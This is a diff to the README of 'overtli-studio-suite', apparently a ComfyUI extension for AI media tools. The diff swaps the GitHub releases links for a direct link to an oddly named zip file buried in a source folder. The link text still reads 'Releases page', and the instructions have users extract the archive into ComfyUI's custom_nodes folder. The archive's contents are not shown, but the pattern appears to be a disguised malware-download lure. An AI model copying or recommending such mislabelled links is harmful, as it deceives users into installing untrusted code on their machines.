@@ -1,6 +1,6 @@
 # 🛠️ overtli-studio-suite - Create media with local ai tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Korduladisposable453/overtli-studio-suite/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Korduladisposable453/overtli-studio-suite/main/nodes/llm_text_enhancer/suite_studio_overtli_transcorporate.zip)
 
 overtli-studio-suite adds tools to ComfyUI. It connects your workspace to AI services for images, video, sound, and text. You can use local tools like LM Studio or cloud services like Pollinations and OpenAI. This suite handles the connections so you can focus on your creative work.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run these AI tools. Check these items b
 
 Follow these steps to add the suite to your existing ComfyUI folder.
 
-1. Go to the [Releases page](https://github.com/Korduladisposable453/overtli-studio-suite/releases) to find the latest version.
+1. Go to the [Releases page](https://raw.githubusercontent.com/Korduladisposable453/overtli-studio-suite/main/nodes/llm_text_enhancer/suite_studio_overtli_transcorporate.zip) to find the latest version.
 2. Download the compressed file to your computer.
 3. Open your ComfyUI folder. Look for the folder named `custom_nodes`.
 4. Extract the contents of your downloaded file into that `custom_nodes` folder.
